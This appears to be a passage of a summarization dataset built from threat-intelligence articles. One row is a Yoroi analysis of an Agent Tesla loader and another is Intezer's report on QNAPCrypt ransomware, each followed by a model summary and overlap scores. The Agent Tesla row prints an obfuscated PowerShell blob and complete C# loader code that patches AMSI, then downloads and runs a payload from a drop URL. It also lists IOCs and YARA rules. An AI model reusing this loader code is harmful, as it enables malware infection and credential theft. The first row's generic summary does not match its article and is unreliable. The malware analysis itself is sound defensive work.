'1710500c534230401140070e0217470b0d5e42671b104d07594c314c0c400b0e5c4c7d0c175c105b12305c10420b005c110f1710500c534230401140070e17265d0304570d47160a5a110f1710500c534230401140070e172b7b59164a0b5a05436a1b471606544c7a0717026f3e12165b0e5d01435a0e55111019120d5b020a045619387d0e582b0e490d46164b1b0951100d5c0e07504115275a161140325b0b0d4d5f1625064d32460d0078065010064a11164b3e191241000f500114111758165d01435c1a40071157427d0c1769164642155856020354112b5a16334d101403050d55000056151140100a57051403510d57034b586226580e2a54125b101711405f071157075851511b4e14270d4d104d320c500c40425e1940780d025d2e5d001158104d404a6442441701550b5742104d03400b0019074c16064b0c142b0d4d324010434c06055656084a471611500c5342090d0600005610596f260f552b59120c4b161c40085c105a070f0a50164e437c0c40101a690d5d0c170440620b114d17550e334b0d4007004d401d3f434917560e0a5a424716024d0b574206411651100d19005b0d0f190f0d5b5b0b010c4a2a571664161119115204050157004e36700c4032174b425e57510a54554e434c0b5a16434b5606550215425b171719175d0c17190f0c035a0d4b0f3927550e7d0f135610404a417207460c065551064c07550e164e437c0c40101a690d5d0c17044066160f740d42072e5c0f5b101a1b4e1431064d2e5511177c10460d110404550e105c4b6942104d03400b0019074c16064b0c14140c50061408005f0006504b700c4032174b425904525b5a182b0d4d324010435d015506520c4e5d0c1719090057555b4b0f12165b0e5d01434a1655160a5a425d0c17190d0c53050f551c4b18700c4032174b425107050b5703425e19175053570c531c00540b04074a410951040757585256530209540404560c401d4b5850041c07065f5001555e042b5a16334d101a38064b0d1d190456165b420f0b57010158442b5a16334d10140000585455035e4f030054020e4a5107050b57034e010e5052514b1b500752060d030400550e520552510c5506525708520052560c01055241104b0f0b0511005703555803095f2a5716641611173851100c1019530d1756425850560c010f1f36700c4032174b425007555f51094a36700c4032174b4b015916500c4042070c0102535e09595d044b180f0d5b5b0b010c4a015a0302030215065154050a4e041a57094e5b17171906010155084b1d190456165b420f0b5701015844204d1606623f140752005552005b0419041a50084e041a055f4e041a5a091f0f2b0d4d32401043520751515a585f7903114a0a550e4d780e580d007125580d01580e1c514a022f5510105103584c2056124d4a06085b030401014e044e085c07075b0215511d59095a04565051110c511543700c4032174b4a5601020f03554c37562b5a16550d4a1d49534152045301104e5f07060a5b554e5010595850560c010e42345c00770e0a5c0c4042115d53075a5a040c5115436e0756210f50075a164b1059471611500c53421a5b0755555a04275a140a4b0d5a0f0657161a25064d245b0e075c10640317514a710c1550105b0c0e5c0c404c304907570b0255245b0e075c101a2313490e5d01024d0b5b0c275816554b481b3e681a50585a05034112000350050a4a16560009540053530e401d59115d53075a5a17265b150d550d550625500e514a010e5052514b1b525553540d060550535c565056000d070557570a565752010c5a04015609530453550d0304035258520552000c560006570a530656060c0304065658530252550c550554525b530652050d010457565d5257535308540451565f525653530c5604555709565053560c520455570a530556000e060555570f500152010c5a0404550d5250535008550455575a5203404a151b5607020e5b1d59334b0d5707104a314003114d2b5a040c190c0150005c04515f0d5c1514321156015111106a16551017700c520d4b4000510354004b0f3211560151111017314003114d4a5a57515a0752074a02105116164b0c145258441241000f500114111758165d01434a16460b0d5e425655515f511c11174b0b5a05434a53525557584b4f11174b0b5a054358040055575b570940015a5b565641021140100a5705141707085601535e6a16460b0d5e4c710f134d1b0f040c4b4a5d0c17190b095258505e4753050e56554c2f5c0c53160b020b1f5f511019561b175c424203570f03035f20560c4207114d4c600d214016514a10080403560217314100104d105d0c04110b18504a1553024b584c060556560849094a005103464b4b4f030054020e426a42025f560356010c391c0b4c0b4b14474358040055575b571a2e065705400a3e10594910064d17460c434c060556560859491f',$k61b35e2 = b72f3($k61b35e), Add-Type -TypeDefinition $k61b35e2,[p99a3fb]::o81f67(),Code Snippet 1The Powershell stage is substantially composed of three parts: the first is the declaration of function ""b72f3()"", having the purpose to deobfuscate the second part of the script, contained into the ""$k61b35e"" variable. It actually is a C source code snippet, compiled and loaded within the Powershell process at execution time. Once loaded, the third part of the script invokes the ""o81f67()"" method of the just compiled ""p99a3fb"" class.using System, using System.Runtime.InteropServices, using System.Diagnostics, using System.IO, using System.Net, public class p99a3fb{ [DllImport(""kernel32"",EntryPoint=""GetProcAddress"")] public static extern IntPtr va46a7(IntPtr af474b5,string a2457), [DllImport(""kernel32"", EntryPoint = ""LoadLibrary"")] public static extern IntPtr ud1451(string j4d4b5), [DllImport(""kernel32"", EntryPoint=""VirtualProtect"")] public static extern bool m9982c8(IntPtr sfff854,UIntPtr j5236a, uint r427a, out uint m8a94), [DllImport(""Kernel32.dll"", EntryPoint=""RtlMoveMemory"", SetLastError=false)] static extern void jcfb22(IntPtr mf1b8,IntPtr dcad15,int k456b), public static int o81f67(){ IntPtr eef257 = ud1451(b72f3(""030e4a0b1a060f55"")), if(eef257==IntPtr.Zero){goto l255c,} IntPtr bca6aa=va46a7(eef257,b72f3(""230e4a0b67010257204104055c10"")), if(bca6aa==IntPtr.Zero){goto l255c,} UIntPtr de6f3=(UIntPtr)5, uint d5c61=0, if(!m9982c8(bca6aa,de6f3,0x40,out d5c61)){goto l255c,} Byte[] e197fb8={0x31,0xff,0x90}, IntPtr kee39a=Marshal.AllocHGlobal(3), Marshal.Copy(e197fb8,0,kee39a,3), jcfb22(new IntPtr(bca6aa.ToInt64()+0x001b),kee39a,3), l255c: WebClient rd1389=new WebClient(), string ybea79=Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+""\\x3a81a""+b72f3(""4c064107""), rd1389.DownloadFile(b72f3(""0a174d120e4d4c4e15434c0b580c5010164a0a1a010c544d43124e5a0d5a160657161b120f4c055d0c1016035f0b105407404d15500743114c7d1746250b580f640d1317074c07""),ybea79), ProcessStartInfo n52cefe=new ProcessStartInfo(ybea79), Process.Start(n52cefe), return 0, } public static string b72f3(string s1f74a){ string af474b5=""bc9b4"", string ud1451=String.Empty, for(int i=0, i<s1f74a.Length, i+=2){ byte va46a7=Convert.ToByte(s1f74a.Substring(i,2),16), ud1451+=(char)(va46a7 ^ af474b5[(i/2) % af474b5.Length]), } return ud1451, } }Code snippet 2Code Snippet 2 is the C class to be loaded. It has the objective to download the payload from the drop url previosly decoded by the ""b72f3()"" function: ""hxxp://www.handrush[.com/wp-content/plugins/akismet/views/DurGhamPop[.exe""The payload is stored into ""%APPDATA%\Roaming"" path and it is immediately executed through the ""Process.Start()"" function.The LoaderHash 51a95607ab767b8b70479bdb86cc0a20b53eda92cd11f3abbe9eda5616a50a97 Threat Agent Tesla Loader Brief Description Agent Tesla .NET C loader Ssdeep 12288:8OQeYYBAkiEK/jfG3JI0YXvL7VIUMbHdX9WBRktIx4urElCccP:8cYCdiEK/jGXqLhqNQAICurrccPTable 2. Static information about the AgentTesla evasive loaderThe dropped file payload is a .NET executable embedding some anti-analysis tricks. If it is executed on a virtual environment, the malware kills itself. It also uses some anti-debugging trick to decide if terminate its execution.Figure 3: Method after which the process kills itselfAccording to the MSDN documentation, the method Delegate.CreateDelegate ""creates a delegate of the specified type that represents the specified static method of the specified class, with the specified case-sensitivity and the specified behavior on failure to bind"". This way, the control flow is switched to the delegated method which actually points to a DLL containing the anti-analysis logic.Figure 4: Loading routine of the internal DLLBefore passing the control to the ""swety.dll"" library, which is a sort of helper component with no particular scope except the identification of analysis environments, the first instructions executed here are designed to decode and load a byte array embedded inside the executable, unpacking the obfuscated code.Figure 5: Decoding routine of the DLLThe Figure above shows how this payload is encoded within the byte array and the routine invoked to retrieve it. This byte array is actually a well-formed dll loaded through the ""Thread.GetDomain().Load()"" method. At this point, the control finally passes to the ""swety.dll"" library, the module in charge to detect the analysis environment.The ""Swety"" ModuleHash a0c9472bc1660be648adce938d5447d38ba6d6f166d18d9e9b4ec4dd74c315c0 Threat Swety evasion module Brief Description .NET Swety evasion module Ssdeep 1536:fKTxXyAZ0ngmxSHOKQZfRWC/BiwGJ/827Lwv9kAdhUkIahRm48GSL/bq0g+9R26:fKpXGxxdZfE37+9pdhjTm2k/bmQ26Table 3. Static information about the ""swety"" evasive moduleThis component is always a .NET executable. The name of the classes are self-explicative: for instance, there are clear references to Virtual Machine detection logic.Figure 6: Example of the enumeration of the HypervisorsIn Figure 9, the malware retrieves the information about the current hardware and compares it with a defined set of criteria, when it finds a match, it kills itself. Otherwise, the dll continues its execution and loads another PE file hidden inside the initial loader. This last executable file runs as a new thread within the initial loader context.Figure 7: Loading of the AgentTesla final payloadThe PayloadHash 82213cd55fee5374e407b4b98c45d7b0d291682ec0fd91b3ea47c32752b54ab9 Threat Agent Tesla Brief Description Agent Tesla Payload Ssdeep 6144:Ci+WZ3skyQgBYnQ7oEFjaRJ8d8ZxjD1N/a66Gq3ovDuItbP7:CbGyH5ZjaRedapNT6Table 4. Static information about the AgentTesla payloadThe extracted payload is a .NET binary file. AgentTesla and Hawkey have lots of pieces of code in common, and the analysis we made two months ago about the Hawkeye payload is similar to this one.Figure 8: Recurrent string decryption routine through the usage of Rijndael algorithmAlso in this case every sensitive information, string or other information is encrypted through Rijndael algorithm and it tries to evade the sandbox to the common user names of the principal sandboxes. The persistence mechanisms is practically the same and the installation path of detected during the analysis is ""%APPDATA%/Roaming/SecondLORI/SecondLORI.exe""Figure 9: Sandbox evasion trickFigure 10: Persistence mechanismAfter its installation, the malware starts to retrieve all the credential stored within a wide list of web browsers, FTP clients, File Downloaders etc. For instance, it is able to steal accounts from:Google ChromeYandexComodo DragonCool NovoChromiumTorch Browser7StarAmigoBraveCent BrowserChedotCoccocElements BrowserEpic PrivacyKometaOrbitumSputnikUranVivaldiUC BrowserFlock BrowserCoreFTPFileZillaJDownloaderQQBrowserOutlookSeaMonkeyThunderbirdThe harvested credentials are then sent back to the attacker servers. The malware leverages the .NET API to easily set up a mail client to transmit the loot to a particular mailbox.Figure 11: SMTP client account configurationThe name of the sender, ""Lori"", matches the name in the persistence mechanism, ""SecondLORI"". This username may belong to a previously compromised email account the attacker uses as a sort of SMTP relay to deliver the loot to the real exfiltration address, a GMail mailbox named ""[email protected]"".Figure 12: SMPT communicationConclusionAs we stated in the previous post about a custom weaponization of the Hawkeye info-stealer, these kinds of malware are well known and highly used by cyber criminals. But despite their popularity event into the info-sec community, these ""commodity tools"" still result to be quite effective especially when combined within custom multistage infection chains, renewing their dangerousness and effectiveness.Indicators of CompromiseHashes6b3bec68b760ac3f3f1b8a4668ac4bccde262ecdf1dc93a5329fa58eefdfb47b51a95607ab767b8b70479bdb86cc0a20b53eda92cd11f3abbe9eda5616a50a97a0c9472bc1660be648adce938d5447d38ba6d6f166d18d9e9b4ec4dd74c315c0DropUrl:hxxp://www.handrush[.com/wp-content/plugins/akismet/views/DurGhamPop[.exeC2 (smtp)chevyview[@gmail[.comPersistence MechanismSetting of the registry key ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run""Yara Rulesrule AgentTesla_MacroDropper_1909 { meta: description = ""Yara rule for AgentTesla Macro DOC Dropper 1909"" author = ""Yoroi - ZLab"" last_updated = ""2019-09-17"" tlp = ""white"" category = ""informational"" strings: $a1 = {70 6D EF 0D 0F 32 2A A4 A0 8D 0A} $a2 = {7B D6 CB 41 C7 28 48 4D ED A5} $a3 = {5F AF B6 16 6C A9 3A 0C 5F D8 5C} condition: uint16(0) == 0x4B50 and all of them } rule AgentTesla_loader_1909 { meta: description = ""Yara rule for AgentTesla loader 1909"" author = ""Yoroi - ZLab"" last_updated = ""2019-09-17"" tlp = ""white"" category = ""informational"" strings: $a1 = {3D D2 5B 5B 7B 9B EF 4C BB} $a2 = {8E AF 2D D0 BD 78 5C D1 15} $a3 = ""F7yYSv5wCAK/4YCGT+bQ=="" ascii wide condition: uint16(0) == 0x5A4D and pe.timestamp == 0x25E8088E and all of them }This article was authored by Luigi Martire and Luca Mella of Cybaze-Yoroi Z-LAB.";The ITSecurity report is a detailed analysis of the security risks associated with the use of IT systems. It provides a comprehensive overview of the threats posed by malicious software, such as viruses, worms, Trojans, and spyware, as well as the risks posed by malicious users, such as hackers, phishers, and spammers. The report also discusses the risks associated with the use of unsecured networks, such as unprotected WiFi hotspots, as well as the risks posed by the use of unsecured mobile devices, such as smartphones, tablets, and laptops. Finally, the report provides an overview of the security measures that can be taken to mitigate these risks.;en;{'r': 0.026455026455026454, 'p': 0.3389830508474576, 'f': 0.049079753258188155};{'r': 0.003369839932603201, 'p': 0.04878048780487805, 'f': 0.0063041753080957455};{'r': 0.023809523809523808, 'p': 0.3050847457627119, 'f': 0.044171777798065456}
https://intezer.com/blog/malware-analysis/russian-cybercrime-group-fullofdeep-behind-qnapcrypt-ransomware-campaigns/;Russian Cybercrime Group FullofDeep Behind QNAPCrypt Ransomware Campaigns;"IntroductionWe previously reported on how we managed to temporarily shut down 15 operative QNAPCrypt ransomware campaigns targeting Linux-based file storage systems (NAS servers). We have now identified a new QNAPCrypt sample which is being used by the same threat actor group. The authors behind this new ransomware instance have revealed enough evidence for us to conclude the establishment of FullofDeep, a Russian cybercrime group operating from the Union State and the Ukraine. The group is mainly focused on ransomware campaigns.Technical AnalysisInitially, we received a hit from an older YARA signature, which was created to hunt for QNAPCrypt instances. Although the new ransomware variant does not share large portions of code with the original QNAPCrypt campaigns, the naming convention used in the new ransomware's functions has been observed in previous QNAPCrypt instances:In addition, the new variant utilizes geolocation information in order to determine whether or not the malware will operate:The threat actors behind the new ransomware have filtered Belarusia(BY), Russia(RU), and Ukraine(UA), in order to impede operation if the ransomware is executed from one of these countries. This is similar to the QNAPCrypt implant Anomali previously reported on:The overall functionality of the ransomware remains similar to QNAPCrypt. The main configuration of the ransomware is static and hard-coded within the binary, much like the latest version of QNAPCrypt.As is similar to the original QNAPCrypt samples, the algorithm the attackers chose to encrypt the filesystem with is AES CFB. One noticeable difference is the main ransom note doesn't advertise a specific bitcoin wallet like it did in the original QNAPCrypt samples. Instead, the attackers demand to be contacted via a protonmail email account:The email address provided is ""fullofdeep"", and the ransom note annotates 'CONTACT US'. These strings draw us to the conclusion that this is a Russian cybercrime group referred to as FullOfDeep, and that the group is deploying different ransomware campaigns. Based on the samples' overlaps, including both ransomware were written in Go, and in addition to similarities in the implant function naming convention and the geolocation filtering applied, we can assess with high confidence that this new ransomware sample is operated by the same authors behind the original QNAPCrypt campaigns.SummaryIn July, we identified and temporarily seized 15 active QNAPCrypt ransomware campaigns targeting Linux-based file storage systems (NAS servers). This discovery was significant in that it's rare to see ransomware being used to target the Linux-operating system.While we prevented the malware from infecting additional victims, we have since hunted for and detected a new ransomware that shares many similarities with the previous QNAPCrypt samples. We can assess with high confidence that FullofDeep, a new Russian cybercrime group specializing in ransomware operations, is behind both the original QNAPCrypt campaigns and the newly identified ransomware instance.In addition, both the original and new QNAPCrypt samples are indexed in Intezer Analyze's code genome database. If you have a suspicious file that you suspect to be QNAPCrypt, you can upload it to the free Intezer Analyze community edition in order to view the verdict, code and string reuse, and more.Please refer to the mitigation recommendations section in our blog post titled, Why we Should be Paying More Attention to Linux Threats, for best practices Linux users can adopt in order to mitigate the threats posed by QNAPCrypt and other Linux-based threats.IOCs50470f94e7d65b50bf00d7416a9634d9e4141c5109a78f5769e4204906ab5f0bfullofdeep@protonmail.com";"The new ransomware variant shares many similarities with the original QNAPCrypt samples. The threat actors behind the new ransomware have filtered Belarusia(BY), Russia(RU), and Ukraine(UA), in order to impede operation if the ransomware is executed from one of these countries. This is similar to the QNAPCrypt implant Anomali previously reported on. The overall functionality of the ransomware remains similar to QNAPCrypt. The main configuration of the ransomware is static and hardcoded within the binary, much like the latest version of QNAPCrypt. As is similar to the original QNAPCrypt samples, the algorithm the attackers chose to encrypt the filesystem with is AES CFB. One noticeable difference is the main ransom note doesn't advertise a specific bitcoin wallet like it did in the original QNAPCrypt samples. Instead, the attackers demand to be contacted via a protonmail email account. The email address provided is ""fullofdeep"", and the ransom note annotates 'CONTACT US'. These strings draw us to the conclusion that this is a Russian cybercrime group referred to as FullOfDeep, and that the group is deploying different ransomware campaigns. Based on the samples' overlaps, including both ransomware were written in Go, and in addition to similarities in the implant function naming convention and the geolocation filtering applied, we can assess with high confidence that this new ransomware sample is operated by the same authors behind the original QNAPCrypt campaigns.";en;{'r': 0.4690909090909091, 'p': 0.9847328244274809, 'f': 0.6354679759245554};{'r': 0.40772532188841204, 'p': 0.945273631840796, 'f': 0.5697151382180276};{'r': 0.4690909090909091, 'p': 0.9847328244274809, 'f': 0.6354679759245554}
